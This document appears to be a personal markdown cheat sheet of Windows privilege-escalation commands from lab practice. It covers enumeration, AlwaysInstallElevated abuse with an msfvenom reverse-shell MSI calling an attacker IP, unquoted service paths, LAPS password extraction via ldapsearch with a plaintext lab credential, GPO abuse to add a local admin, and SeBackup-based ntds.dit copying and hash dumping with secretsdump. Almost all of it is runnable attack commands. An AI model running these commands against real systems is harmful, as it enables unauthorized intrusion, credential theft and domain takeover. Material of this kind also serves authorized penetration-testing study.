# WindowsPE
----------------

## Basic Checks
User  and Groups
```cmd
net user 
net user /domain
net group /domain
```

OS and Architecture
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Running Processes and Services
```cmd
tasklist /SVC
```

Network
```cmd
ipconfig /all
route print
```

Firewall
```cmd
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```

Installed Applications
```cmd

```

Writeable Directories
```cmd
accesschk.exe -uws "Everyone" "C:\Program Files"
```

```cmd
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

```cmd
icacls
```

list hidden directories
```cmd
dir /a:hd
```


## AlwaysInstallElevated
https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
```

If the output of the both reg keys are equal to "0x1" always install elevated is exploitable.

Generate a msi payload using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.166 LPORT=443 -f msi -o shell.msi
```

install the msi:
```cmd
C:> msiexec /quiet /qn /i  install.msi
```

---------------

## WSL
```cmd
where /R C:\windows bash.exe

where /R C:\windows wsl.exe
```

```Powershell
gci -r . bash.exe
gci -r . wsl.exe

Get-ChildItem -Recurse . bash.exe
```

```cmd
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22000.1_none_d9322203d3a93255\wsl.exe whoami

C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22000.1_none_95defc35c15b2b6b\bash.exe #will land a shell
```
--------------

## Unqouted Service Paths
https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/
https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths

```cmd
HKLM\SYSTEM\CurrentControlSet\Services\Servicename
```

```cmd
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

```cmd
sc qc FoxitCloudUpdateService
```

```cmd
shutdown.exe -r -f -t 1
```

```cmd
sc start "servicename"
```
-----------------------

## LAPS
If we find the folder LAPS in `C:\Program Files` and have the password of a domain user, we can use ldapsearch to get password of the Administrator:
```bash
ldapsearch -D fmcsorley@HUTCH.offsec -w CrabSharkJellyfish192 -o ldif-wrap=no -b 'dc=hutch,dc=offsec' -H ldap://192.168.209.122 "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd
```
-------------------

## GPO
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo
Using StandIn to abuse GPO:
https://github.com/FuzzySecurity/StandIn#spn

```Powershell
StandIn.exe --gpo  # list GPO

StandIn.exe --gpo --filter "Default Domain Policy" --acl  # list GPO permissions

StandIn.exe --gpo --filter "Default Domain Policy" --localadmin anirudh
```

After adding the user anirudh to the local administrators group we have to update the group policy.
```Powershell
gpupdate /force
```

-----------------

## SeBackup
---------------
https://github.com/giuliano108/SeBackupPrivilege

Import the DLL using:
```
Import-Module ./SeBackupPrivilegeUtils.dll
Import-Module ./SeBackupPrivilegeCmdLets.dll
```

copy.txt for shadow copy:
```txt
set context persistent nowriters
set metadata C:\temp\metadata.cab
set verbose on
add volume c: alias mycopy
create
expose %mycopy% x:
```

```
diskshadow /s copy.txt
```

```
Copy-FileSeBackupPrivilege x:windows\ntds\ntds.dit C:\temp\ntds.dit

reg save hklm\system C:\temp\system.back
```

```bash
python3 /opt/impacket/examples/secretsdump.py -ntds ntds.dit -system system.back local
```





